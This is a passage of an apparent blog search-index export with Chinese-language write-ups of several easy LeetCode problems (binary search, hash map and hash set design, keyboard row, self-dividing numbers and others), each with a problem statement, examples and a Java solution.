    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个 <code>n</code> 个元素有序的（升序）整型数组 <code>nums</code> 和一个目标值 <code>target</code>  ，写一个函数搜索 <code>nums</code> 中的 <code>target</code>，如果目标值存在返回下标，否则返回 -1。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums &#x3D; [-1,0,3,5,9,12], target &#x3D; 9</span><br><span class="line">输出: 4</span><br><span class="line">解释: 9 出现在 nums 中并且下标为 4</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums &#x3D; [-1,0,3,5,9,12], target &#x3D; 2</span><br><span class="line">输出: -1</span><br><span class="line">解释: 2 不存在 nums 中因此返回 -1</span><br></pre></td></tr></table></figure>
<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ol>
<li>你可以假设 <code>nums</code> 中的所有元素是不重复的。</li>
<li><code>n</code> 将在 <code>[1, 10000]</code>之间。</li>
<li><code>nums</code> 的每个元素都将在 <code>[-9999, 9999]</code>之间。</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>二分查找即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> begin = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> end = nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (begin &lt;= end) &#123;</span><br><span class="line">        	<span class="keyword">int</span> mid = (begin + end) / <span class="number">2</span>;</span><br><span class="line">        	<span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">        		begin++;</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">        		end--;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		<span class="keyword">return</span> mid;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二分查找</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>706. 设计哈希映射</title>
    <url>/2018/08/29/LeetCode/leetcode-000706-%E8%AE%BE%E8%AE%A1%E5%93%88%E5%B8%8C%E6%98%A0%E5%B0%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>不使用任何内建的哈希表库设计一个哈希映射</p>
<p>具体地说，你的设计应该包含以下的功能：</p>
<ul>
<li><code>put(key, value)</code>：向哈希映射中插入(键,值)的数值对。如果键对应的值已经存在，更新这个值。</li>
<li><code>get(key)</code>：返回给定的键所对应的值，如果映射中不包含这个键，返回-1。</li>
<li><code>remove(key)</code>：如果映射中存在这个键，删除这个数值对。</li>
</ul>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MyHashMap hashMap = <span class="keyword">new</span> MyHashMap();</span><br><span class="line">hashMap.put(<span class="number">1</span>, <span class="number">1</span>);          </span><br><span class="line">hashMap.put(<span class="number">2</span>, <span class="number">2</span>);         </span><br><span class="line">hashMap.get(<span class="number">1</span>);            <span class="comment">// 返回 1</span></span><br><span class="line">hashMap.get(<span class="number">3</span>);            <span class="comment">// 返回 -1 (未找到)</span></span><br><span class="line">hashMap.put(<span class="number">2</span>, <span class="number">1</span>);         <span class="comment">// 更新已有的值</span></span><br><span class="line">hashMap.get(<span class="number">2</span>);            <span class="comment">// 返回 1 </span></span><br><span class="line">hashMap.remove(<span class="number">2</span>);         <span class="comment">// 删除键为2的数据</span></span><br><span class="line">hashMap.get(<span class="number">2</span>);            <span class="comment">// 返回 -1 (未找到)</span></span><br></pre></td></tr></table></figure>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ul>
<li>所有的值都在 <code>[1, 1000000]</code>的范围内。</li>
<li>操作的总数目在<code>[1, 10000]</code>范围内。</li>
<li>不要使用内建的哈希库。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>申请一个1000001长度的数组，使用索引作为HashMap的key值，数组对应索引位置上则存储HashMap的value值。数组每个位置的值初始化为-1，清空之后也设置为-1，表示没有该索引为key的值。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHashMap</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span>[] data;</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyHashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        data = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">1000001</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">1000001</span>;i++) &#123;</span><br><span class="line">        	data[i] = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** value will always be positive. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        data[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns the value to which the specified key is mapped, or -1 if this map contains no mapping for the key */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data[key];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Removes the mapping of the specified value key if this map contains a mapping for the key */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        data[key] = -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyHashMap object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyHashMap obj = new MyHashMap();</span></span><br><span class="line"><span class="comment"> * obj.put(key,value);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.get(key);</span></span><br><span class="line"><span class="comment"> * obj.remove(key);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title>500. 键盘行</title>
    <url>/2018/08/29/LeetCode/leetcode-000500.%20%E9%94%AE%E7%9B%98%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个单词列表，只返回可以使用在键盘同一行的字母打印出来的单词。键盘如下图所示。</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000500-keyboard.png" alt="键盘示例"></p>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [&quot;Hello&quot;, &quot;Alaska&quot;, &quot;Dad&quot;, &quot;Peace&quot;]</span><br><span class="line">输出: [&quot;Alaska&quot;, &quot;Dad&quot;]</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul>
<li>你可以重复使用键盘上同一字符。</li>
<li>你可以假设输入的字符串将只包含字母。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>将每行键盘的字母初始化成一个set，统计每个单词在每行的落点数，任意行的落点数目等于字符串长度的话，表示该单词是一行键盘字母生成的。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    HashSet&lt;Character&gt; l1 = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    HashSet&lt;Character&gt; l2 = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    HashSet&lt;Character&gt; l3 = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> String[] findWords(String[] words) &#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (words.length == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> String[<span class="number">0</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">        init(l1, l2, l3);</span><br><span class="line">        List&lt;String&gt; result = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String s : words) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (isMeetCondition(s) ) &#123;</span><br><span class="line">        		result.add(s);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result.toArray(<span class="keyword">new</span> String[result.size()]);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isMeetCondition</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> s1 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> s2 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> s3 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>;index &lt; s.length();index++) &#123;</span><br><span class="line">			<span class="keyword">char</span> c = s.charAt(index);</span><br><span class="line">			<span class="keyword">if</span> (l1.contains(c)) &#123;</span><br><span class="line">				s1++;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (l2.contains(c)) &#123;</span><br><span class="line">				s2++;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				s3++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> (s1 == s.length() || s2 == s.length() || s3 == s.length());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(HashSet&lt;Character&gt; l1, HashSet&lt;Character&gt; l2, HashSet&lt;Character&gt; l3)</span> </span>&#123;</span><br><span class="line">		l1.add(<span class="string">'Q'</span>);</span><br><span class="line">		l1.add(<span class="string">'W'</span>);</span><br><span class="line">		l1.add(<span class="string">'E'</span>);</span><br><span class="line">		l1.add(<span class="string">'R'</span>);</span><br><span class="line">		l1.add(<span class="string">'T'</span>);</span><br><span class="line">		l1.add(<span class="string">'Y'</span>);</span><br><span class="line">		l1.add(<span class="string">'U'</span>);</span><br><span class="line">		l1.add(<span class="string">'I'</span>);</span><br><span class="line">		l1.add(<span class="string">'O'</span>);</span><br><span class="line">		l1.add(<span class="string">'P'</span>);</span><br><span class="line">		l2.add(<span class="string">'A'</span>);</span><br><span class="line">		l2.add(<span class="string">'S'</span>);</span><br><span class="line">		l2.add(<span class="string">'D'</span>);</span><br><span class="line">		l2.add(<span class="string">'F'</span>);</span><br><span class="line">		l2.add(<span class="string">'G'</span>);</span><br><span class="line">		l2.add(<span class="string">'H'</span>);</span><br><span class="line">		l2.add(<span class="string">'J'</span>);</span><br><span class="line">		l2.add(<span class="string">'K'</span>);</span><br><span class="line">		l2.add(<span class="string">'L'</span>);</span><br><span class="line">		l3.add(<span class="string">'Z'</span>);</span><br><span class="line">		l3.add(<span class="string">'X'</span>);</span><br><span class="line">		l3.add(<span class="string">'C'</span>);</span><br><span class="line">		l3.add(<span class="string">'V'</span>);</span><br><span class="line">		l3.add(<span class="string">'B'</span>);</span><br><span class="line">		l3.add(<span class="string">'N'</span>);</span><br><span class="line">		l3.add(<span class="string">'M'</span>);</span><br><span class="line">		</span><br><span class="line">		l1.add(<span class="string">'q'</span>);</span><br><span class="line">		l1.add(<span class="string">'w'</span>);</span><br><span class="line">		l1.add(<span class="string">'e'</span>);</span><br><span class="line">		l1.add(<span class="string">'r'</span>);</span><br><span class="line">		l1.add(<span class="string">'t'</span>);</span><br><span class="line">		l1.add(<span class="string">'y'</span>);</span><br><span class="line">		l1.add(<span class="string">'u'</span>);</span><br><span class="line">		l1.add(<span class="string">'i'</span>);</span><br><span class="line">		l1.add(<span class="string">'o'</span>);</span><br><span class="line">		l1.add(<span class="string">'p'</span>);</span><br><span class="line">		</span><br><span class="line">		l2.add(<span class="string">'a'</span>);</span><br><span class="line">		l2.add(<span class="string">'s'</span>);</span><br><span class="line">		l2.add(<span class="string">'d'</span>);</span><br><span class="line">		l2.add(<span class="string">'f'</span>);</span><br><span class="line">		l2.add(<span class="string">'g'</span>);</span><br><span class="line">		l2.add(<span class="string">'h'</span>);</span><br><span class="line">		l2.add(<span class="string">'j'</span>);</span><br><span class="line">		l2.add(<span class="string">'k'</span>);</span><br><span class="line">		l2.add(<span class="string">'l'</span>);</span><br><span class="line">		l3.add(<span class="string">'z'</span>);</span><br><span class="line">		l3.add(<span class="string">'x'</span>);</span><br><span class="line">		l3.add(<span class="string">'c'</span>);</span><br><span class="line">		l3.add(<span class="string">'v'</span>);</span><br><span class="line">		l3.add(<span class="string">'b'</span>);</span><br><span class="line">		l3.add(<span class="string">'n'</span>);</span><br><span class="line">		l3.add(<span class="string">'m'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>709. 转换成小写字母</title>
    <url>/2018/08/29/LeetCode/leetcode-000709.%20%E8%BD%AC%E6%8D%A2%E6%88%90%E5%B0%8F%E5%86%99%E5%AD%97%E6%AF%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实现函数 ToLowerCase()，该函数接收一个字符串参数 str，并将该字符串中的大写字母转换成小写字母，之后返回新的字符串。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;Hello&quot;</span><br><span class="line">输出: &quot;hello&quot;</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;here&quot;</span><br><span class="line">输出: &quot;here&quot;</span><br></pre></td></tr></table></figure>
<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;LOVELY&quot;</span><br><span class="line">输出: &quot;lovely&quot;</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>之前看过JDK的源码，toLowerCase实现起来好复杂，所以这边偷懒直接调用了库函数。如果题目中字符串只包含ASCII码的话，直接相减就行了。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toLowerCase</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>728. 自除数</title>
    <url>/2018/08/29/LeetCode/leetcode-000728.%20%E8%87%AA%E9%99%A4%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>自除数 是指可以被它包含的每一位数除尽的数。<br>例如，128 是一个自除数，因为 <code>128 % 1 == 0</code>，<code>128 % 2 == 0</code>，<code>128 % 8 == 0</code>。</p>
<p>还有，自除数不允许包含 0 。</p>
<p>给定上边界和下边界数字，输出一个列表，列表的元素是边界（含边界）内所有的自除数。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： </span><br><span class="line">上边界left &#x3D; 1, 下边界right &#x3D; 22</span><br><span class="line">输出： [1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 15, 22]</span><br></pre></td></tr></table></figure>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ul>
<li>每个输入参数的边界满足 <code>1 &lt;= left &lt;= right &lt;= 10000</code>。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>暴力</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">selfDividingNumbers</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> IntStream.range(left, right + <span class="number">1</span>).filter(n -&gt; isSelfDividing(n)).boxed().collect(Collectors.toList());</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isSelfDividing</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> (num + <span class="string">""</span>).chars().allMatch(c -&gt; (c != <span class="string">'0'</span> &amp;&amp; (num % Character.getNumericValue(c)) == <span class="number">0</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>705. 设计哈希集合</title>
    <url>/2018/08/29/LeetCode/leetcode-000705.%20%E8%AE%BE%E8%AE%A1%E5%93%88%E5%B8%8C%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>不使用任何内建的哈希表库设计一个哈希集合</p>
<p>具体地说，你的设计应该包含以下的功能</p>
<p>· <code>add(value)</code>：向哈希集合中插入一个值。<br>· <code>contains(value)</code> ：返回哈希集合中是否存在这个值。<br>· <code>remove(value)</code>：将给定值从哈希集合中删除。如果哈希集合中没有这个值，什么也不做。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MyHashSet hashSet = <span class="keyword">new</span> MyHashSet();</span><br><span class="line">hashSet.add(<span class="number">1</span>);         </span><br><span class="line">hashSet.add(<span class="number">2</span>);         </span><br><span class="line">hashSet.contains(<span class="number">1</span>);    <span class="comment">// 返回 true</span></span><br><span class="line">hashSet.contains(<span class="number">3</span>);    <span class="comment">// 返回 false (未找到)</span></span><br><span class="line">hashSet.add(<span class="number">2</span>);          </span><br><span class="line">hashSet.contains(<span class="number">2</span>);    <span class="comment">// 返回 true</span></span><br><span class="line">hashSet.remove(<span class="number">2</span>);          </span><br><span class="line">hashSet.contains(<span class="number">2</span>);    <span class="comment">// 返回  false (已经被删除)</span></span><br></pre></td></tr></table></figure>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>· 所有的值都在 [1, 1000000]的范围内。<br>· 操作的总数目在[1, 10000]范围内。<br>· 不要使用内建的哈希集合库。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>因为值的范围是确定的，那么，可以申请一个长度为1000001的数组，使用下标作为索引，来保存数据。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHashSet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] data;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyHashSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        data = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">1000001</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    	data[key] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        data[key] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns true if this set did not already contain the specified element */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data[key] == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyHashSet object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyHashSet obj = new MyHashSet();</span></span><br><span class="line"><span class="comment"> * obj.add(key);</span></span><br><span class="line"><span class="comment"> * obj.remove(key);</span></span><br><span class="line"><span class="comment"> * boolean param_3 = obj.contains(key);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>哈希</tag>
      </tags>
  </entry>
  <entry>
    <title>771. 宝石与石头</title>
    <url>/2018/08/29/LeetCode/leetcode-000771.%20%E5%AE%9D%E7%9F%B3%E4%B8%8E%E7%9F%B3%E5%A4%B4/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定字符串<code>J</code>代表石头中宝石的类型，和字符串<code>S</code>代表你拥有的石头。 <code>S</code> 中每个字符代表了一种你拥有的石头的类型，你想知道你拥有的石头中有多少是宝石。</p>
<p><code>J</code> 中的字母不重复，<code>J</code> 和 <code>S</code>中的所有字符都是字母。字母区分大小写，因此”a”和”A”是不同类型的石头。</p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: J &#x3D; &quot;aA&quot;, S &#x3D; &quot;aAAbbbb&quot;</span><br><span class="line">输出: 3</span><br></pre></td></tr></table></figure>
<h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例 2:"></a>示例 2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: J &#x3D; &quot;z&quot;, S &#x3D; &quot;ZZ&quot;</span><br><span class="line">输出: 0</span><br></pre></td></tr></table></figure>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意:"></a>注意:</h2><ul>
<li>S 和 J 最多含有50个字母。</li>
<li>J 中的字符不重复。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>直接计算即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numJewelsInStones</span><span class="params">(String J, String S)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; S.length();i++) &#123;</span><br><span class="line">        	<span class="keyword">char</span> c = S.charAt(i);</span><br><span class="line">        	<span class="keyword">if</span> (-<span class="number">1</span> != J.indexOf(c)) &#123;</span><br><span class="line">        		sum++;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>804. 唯一摩尔斯密码词</title>
    <url>/2018/08/29/LeetCode/leetcode-000804.%20%E5%94%AF%E4%B8%80%E6%91%A9%E5%B0%94%E6%96%AF%E5%AF%86%E7%A0%81%E8%AF%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>国际摩尔斯密码定义一种标准编码方式，将每个字母对应于一个由一系列点和短线组成的字符串， 比如: “a” 对应 “.-“, “b” 对应 <code>&quot;-...&quot;</code>, <code>&quot;c&quot;</code> 对应 <code>&quot;-.-.&quot;</code>, 等等。</p>
<p>为了方便，所有26个英文字母对应摩尔斯密码表如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&quot;.-&quot;,&quot;-...&quot;,&quot;-.-.&quot;,&quot;-..&quot;,&quot;.&quot;,&quot;..-.&quot;,&quot;--.&quot;,&quot;....&quot;,&quot;..&quot;,&quot;.---&quot;,&quot;-.-&quot;,&quot;.-..&quot;,&quot;--&quot;,&quot;-.&quot;,&quot;---&quot;,&quot;.--.&quot;,&quot;--.-&quot;,&quot;.-.&quot;,&quot;...&quot;,&quot;-&quot;,&quot;..-&quot;,&quot;...-&quot;,&quot;.--&quot;,&quot;-..-&quot;,&quot;-.--&quot;,&quot;--..&quot;]</span><br></pre></td></tr></table></figure>
<p>给定一个单词列表，每个单词可以写成每个字母对应摩尔斯密码的组合。例如，”cab” 可以写成 “-.-.-….-“，(即 “-.-.” + “-…” + “.-“字符串的结合)。我们将这样一个连接过程称作单词翻译。<br>返回我们可以获得所有词不同单词翻译的数量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如:</span><br><span class="line">输入: words &#x3D; [&quot;gin&quot;, &quot;zen&quot;, &quot;gig&quot;, &quot;msg&quot;]</span><br><span class="line">输出: 2</span><br><span class="line">解释: </span><br><span class="line">各单词翻译如下:</span><br><span class="line">&quot;gin&quot; -&gt; &quot;--...-.&quot;</span><br><span class="line">&quot;zen&quot; -&gt; &quot;--...-.&quot;</span><br><span class="line">&quot;gig&quot; -&gt; &quot;--...--.&quot;</span><br><span class="line">&quot;msg&quot; -&gt; &quot;--...--.&quot;</span><br><span class="line"></span><br><span class="line">共有 2 种不同翻译, &quot;--...-.&quot; 和 &quot;--...--.&quot;.</span><br></pre></td></tr></table></figure>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ul>
<li>单词列表<code>words</code> 的长度不会超过 <code>100</code>。</li>
<li>每个单词 <code>words[i]</code>的长度范围为 <code>[1, 12]</code>。</li>
<li>每个单词 <code>words[i]</code>只包含小写字母。</li>
</ul>
